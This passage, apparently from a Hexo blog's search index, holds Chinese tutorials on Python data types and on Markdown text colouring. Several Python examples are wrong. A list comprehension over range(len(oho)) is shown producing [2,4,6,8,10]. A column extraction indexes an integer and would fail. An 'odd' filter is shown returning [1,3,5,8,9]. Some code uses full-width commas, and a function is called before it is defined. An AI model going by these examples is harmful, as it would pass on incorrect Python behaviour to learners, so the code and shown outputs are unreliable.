class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原循环</span></span><br><span class="line">oho = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(oho)):</span><br><span class="line">    oho[i] = oho[i]*<span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;oho</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#现列表推导式</span></span><br><span class="line">oho = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">oho=[i*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(oho))]</span><br><span class="line">&gt;&gt;&gt;oho</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">matrix = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">          [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],</span><br><span class="line">          [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">col2  =[row[<span class="number">1</span>] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]</span><br><span class="line">&gt;&gt;&gt;col2</span><br><span class="line">[<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">diag1 =[matrix[i][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]</span><br><span class="line">&gt;&gt;&gt;diag1</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">diag2 =[matrix[i][<span class="number">2</span>-i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]</span><br><span class="line">&gt;&gt;&gt;diag2</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><blockquote><p>利用列表推导式创建嵌套列表<br>s&#x3D; [ [0]*3 for i in range(3) ]</p></blockquote><blockquote><p>为列表推导式增加条件</p></blockquote><p>形式：**[expression for target in iterable if condition]**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">even = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">&gt;&gt;&gt;even</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>，<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">odd = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>) <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">&gt;&gt;&gt;odd</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>，<span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">words = [<span class="string">&quot;Great&quot;</span>,<span class="string">&quot;FishC&quot;</span>,<span class="string">&quot;Brilliant&quot;</span>,<span class="string">&quot;Excellent&quot;</span>,<span class="string">&quot;Fantistic&quot;</span>]fwords = [w <span class="keyword">for</span> w <span class="keyword">in</span> words <span class="keyword">if</span> w[<span class="number">0</span>] ==<span class="string">&#x27;F&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;fwords</span><br><span class="line">[<span class="string">&quot;FishC&quot;</span>,<span class="string">&quot;Fantistic&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h3><p>元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。</p><p>元组中的元素类型也可以不相同： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span> = ( <span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>  )</span><br><span class="line">tinytuple = (<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>)             <span class="comment"># 输出完整元组</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>[<span class="number">0</span>])          <span class="comment"># 输出元组的第一个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>[<span class="number">1</span>:<span class="number">3</span>])        <span class="comment"># 输出从第二个元素开始到第三个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span>[<span class="number">2</span>:])         <span class="comment"># 输出从第三个元素开始的所有元素</span></span><br><span class="line"><span class="built_in">print</span> (tinytuple * <span class="number">2</span>)     <span class="comment"># 输出两次元组</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">tuple</span> + tinytuple) <span class="comment"># 连接元组</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abcd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">786</span>, <span class="number">2.23</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>)</span><br></pre></td></tr></table></figure><p>元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取（看上面，这里不再赘述）。</p><p>其实，可以把字符串看作一种特殊的元组。 修改元组元素的操作是非法的</p><blockquote><p>建立一个只有一个元素的元组： x&#x3D;(520,),其中逗号很关键</p></blockquote><blockquote><p>打包和解包</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打包</span></span><br><span class="line">t = (<span class="number">123</span>，<span class="string">&quot;Fishc&quot;</span>，<span class="number">3.14</span>)</span><br><span class="line">&gt;&gt;&gt;t</span><br><span class="line">(<span class="number">123</span>，<span class="string">&#x27;FishC&#x27;</span>，<span class="number">3.14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#解包</span></span><br><span class="line">x，y，z= t</span><br><span class="line">&gt;&gt;&gt;X</span><br><span class="line"><span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line"><span class="string">&#x27;FishC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; Z</span></span><br><span class="line"><span class="string">3.14</span></span><br></pre></td></tr></table></figure><blockquote><p>其他序列类型也可以实现打包和解包</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a,b,c,d,e=<span class="string">&quot;FishC&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;c</span></span><br><span class="line"><span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a,b,*c=&quot;</span>FishC<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;c</span></span><br><span class="line"><span class="string">[&#x27;</span>s<span class="string">&#x27;,&#x27;</span>h<span class="string">&#x27;,&#x27;</span>C<span class="string">&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h3><p>集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。</p><p>基本功能是进行成员关系测试和删除重复元素。</p><p>可以使用大括号 { } 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</p><p>创建格式：</p><ul><li>parame &#x3D; {value01,value02,…}</li><li>set(value)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">sites = &#123;<span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>, <span class="string">&#x27;Zhihu&#x27;</span>, <span class="string">&#x27;Baidu&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sites)   <span class="comment"># 输出集合，重复的元素被自动去掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成员测试</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Runoob&#x27;</span> <span class="keyword">in</span> sites :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Runoob 在集合中&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Runoob 不在集合中&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set可以进行集合运算</span></span><br><span class="line">a = <span class="built_in">set</span>(<span class="string">&#x27;abracadabra&#x27;</span>)</span><br><span class="line">b = <span class="built_in">set</span>(<span class="string">&#x27;alacazam&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a - b)     <span class="comment"># a 和 b 的差集</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a | b)     <span class="comment"># a 和 b 的并集</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a &amp; b)     <span class="comment"># a 和 b 的交集</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a ^ b)     <span class="comment"># a 和 b 中不同时存在的元素</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;Zhihu&#x27;</span>, <span class="string">&#x27;Baidu&#x27;</span>, <span class="string">&#x27;Taobao&#x27;</span>, <span class="string">&#x27;Runoob&#x27;</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Runoob 在集合中</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h3><p>字典（dictionary）是Python中另一个非常有用的内置数据类型。</p><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典是一种映射类型，字典用 { } 标识，它是一个 <em><strong>无序的 键(key) : 值(value)</strong></em> 的集合。</p><p>键(key)必须使用不可变类型。</p><p>在同一个字典中，键(key)必须是唯一的。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>] = <span class="string">&quot;1 - 菜鸟教程&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="number">2</span>]     = <span class="string">&quot;2 - 菜鸟工具&quot;</span></span><br><span class="line"></span><br><span class="line">tinydict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;site&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>])       <span class="comment"># 输出键为 &#x27;one&#x27; 的值</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">dict</span>[<span class="number">2</span>])           <span class="comment"># 输出键为 2 的值</span></span><br><span class="line"><span class="built_in">print</span> (tinydict)          <span class="comment"># 输出完整的字典</span></span><br><span class="line"><span class="built_in">print</span> (tinydict.keys())   <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span> (tinydict.values()) <span class="comment"># 输出所有值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> - 菜鸟教程</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> - 菜鸟工具</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;site&#x27;</span>: <span class="string">&#x27;www.runoob.com&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict_keys([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;site&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict_values([<span class="string">&#x27;runoob&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;www.runoob.com&#x27;</span>])</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>   1、字典是一种映射类型，它的元素是键值对。<br>   2、字典的关键字必须为不可变类型，且不能重复。<br>   3、创建空字典使用 { }。</p></blockquote><h3 id="Python数据类型转换"><a href="#Python数据类型转换" class="headerlink" title="Python数据类型转换"></a>Python数据类型转换</h3><p>以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>int(x [,base])</td><td>将x转换为一个整数</td></tr><tr><td>float(x)</td><td>将x转换到一个浮点数</td></tr><tr><td>complex(real [,imag])</td><td>创建一个复数</td></tr><tr><td>str(x)</td><td>将对象 x 转换为字符串</td></tr><tr><td>repr(x)</td><td>将对象 x 转换为表达式字符串</td></tr><tr><td>eval(str)</td><td>用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td>tuple(s)</td><td>将序列 s 转换为一个元组</td></tr><tr><td>list(s)</td><td>将序列 s 转换为一个列表</td></tr><tr><td>set(s)</td><td>转换为可变集合</td></tr><tr><td>dict(d)</td><td>建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td>frozenset(s)</td><td>转换为不可变集合</td></tr><tr><td>chr(x)</td><td>将一个整数转换为一个字符</td></tr><tr><td>ord(x)</td><td>将一个字符转换为它的整数值</td></tr><tr><td>hex(x)</td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td>oct(x)</td><td>将一个整数转换为一个八进制字符串</td></tr></tbody></table><h3 id="Python成员运算符-amp-身份运算符"><a href="#Python成员运算符-amp-身份运算符" class="headerlink" title="Python成员运算符&amp;身份运算符"></a>Python成员运算符&amp;身份运算符</h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>in</td><td>如果在指定的序列中找到值返回 True，否则返回 False。</td><td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td>not in</td><td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><p>身份运算符用于比较两个对象的存储单元</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>is</td><td>is 是判断两个标识符是不是引用自一个对象</td><td>x is y, 类似 id(x) &#x3D;&#x3D; id(y) , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td>is not</td><td>is not 是判断两个标识符是不是引用自不同对象</td><td>x is not y ， 类似 id(x) !&#x3D; id(y)。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><h1 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h1><p>Python 中用<strong>elif</strong>代替了 else if，所以if语句的关键字为：<strong>if – elif – else</strong>。</p><blockquote><p>注意：</p><p>   1、每个条件后面要使用冒号 :，表示接下来是满足条件后要执行的语句块。</p><p>   2、使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。</p><p>   3、在 Python 中没有 switch…case 语句，但在 Python3.10 版本添加了 match…case，功能也类似。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mystatus=<span class="number">400</span></span><br><span class="line"><span class="built_in">print</span>(http_error(<span class="number">400</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_error</span>(<span class="params">status</span>):</span><br><span class="line">    match status:</span><br><span class="line">        case <span class="number">400</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Bad request&quot;</span></span><br><span class="line">        case <span class="number">404</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Not found&quot;</span></span><br><span class="line">        case <span class="number">418</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I&#x27;m a teapot&quot;</span></span><br><span class="line">        case _:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something&#x27;s wrong with the internet&quot;</span></span><br></pre></td></tr></table></figure><p>一个 case 也可以设置多个匹配条件，条件使用 ｜ 隔开，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    case <span class="number">401</span>|<span class="number">403</span>|<span class="number">404</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not allowed&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法(二)</title>
      <link href="/post/a1b131e4.html"/>
      <url>/post/a1b131e4.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、更改字体、颜色、大小"><a href="#一、更改字体、颜色、大小" class="headerlink" title="一、更改字体、颜色、大小"></a>一、更改字体、颜色、大小</h1><h2 id="1、Markdown语法"><a href="#1、Markdown语法" class="headerlink" title="1、Markdown语法"></a>1、Markdown语法</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;微软雅黑&quot;</span>&gt;</span></span>微软雅黑<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;STCAIYUN&quot;</span>&gt;</span></span>华文彩云<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#008000</span>&gt;</span></span>绿色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">Red</span>&gt;</span></span>红色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">5</span>&gt;</span></span>尺寸<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em><strong>效果如下</strong></em></p><p><font face="黑体">黑体字</font></p><p><font face="微软雅黑">微软雅黑</font></p><p><font face="STCAIYUN">华文彩云</font></p><p><font color=blue>蓝色</font></p><p><font color=#008000>绿色</font></p><p><font color=Red>红色</font></p><p><font size=5>尺寸</font></p><h2 id="2、一些常用颜色"><a href="#2、一些常用颜色" class="headerlink" title="2、一些常用颜色"></a>2、一些常用颜色</h2><p><font color=NavajoWhite>color&#x3D;NavajoWhite</font></p><p><font color=Feldspar>color&#x3D;Feldspar</font></p><p><font color=SandyBrown>color&#x3D;SandyBrown</font></p><p><font color=LightSalmon>color&#x3D;LightSalmon</font></p><p><font color=Pink>color&#x3D;Pink</font></p><p><font color=PaleVioletRed>color&#x3D;PaleVioletRed</font></p><p><font color=HotPink>color&#x3D;HotPink</font></p><h2 id="3-文字底色"><a href="#3-文字底色" class="headerlink" title="3.文字底色"></a>3.文字底色</h2><p>借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。将那一整行看作一个表格，更改整个格子的背景色（bgcolor）</p><p>Markdown语法:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">DarkSeaGreen</span>&gt;</span></span>这里的背景色是：DarkSeaGreen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果：</p><table><tr><td bgcolor=DarkSeaGreen>这里的背景色是：DarkSeaGreen，此处输入任意想输入的内容</td></tr></table><table><tr><td bgcolor=Beige>这里的背景色是：Beige，此处输入任意想输入的内容</td></tr></table><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRose，此处输入任意想输入的内容</td></tr></table>]]></content>
      
      
      <categories>
          
          <category> MarkDown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机通信与网络</title>
      <link href="/post/7da59eac.html"/>
      <url>/post/7da59eac.html</url>
      
